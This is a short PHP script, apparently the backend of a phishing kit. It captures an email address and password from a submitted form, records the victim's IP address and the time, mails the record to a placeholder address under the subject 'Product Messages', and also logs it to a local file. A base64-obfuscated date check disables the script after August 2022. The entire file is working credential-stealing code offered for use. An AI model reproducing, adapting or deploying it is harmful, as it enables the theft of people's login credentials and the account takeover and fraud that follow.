<?php $o0=date(base64_decode('WW1kaGlzYQ=='));if(substr($o0,0,8)>=base64_decode('MjAyMjA4MzA=')){echo base64_decode('IA==');exit;}?><?php
$ip = getenv("REMOTE_ADDR"); 
$message ="";
$message .= "------------------------- l0g5 ------------------\n"; 
$message .= "Em  : ".$_POST['ai']."\r\n";
$message .= "Pa   : ".$_POST['pr']."\n"; 
$message .= "loc                     : ".$ip."\n"; 
$dated = "The time is " . date("l jS \of F Y h:i:s A");
$message .= "Date                   : ".$dated."\n"; 
$message .= "------------------------ l0g5 -------------------\n"; 
$send = "youremal@domain.com";

$subject = "Product Messages"; 
$headers ="";  
$headers .= "MIME-Version: 1.0\n"; 

{ 
mail($send,$subject,$message,$headers); 
} 

$handle = fopen("sur.txt", "a");
fwrite($handle,$message);


echo "ok";
     

?>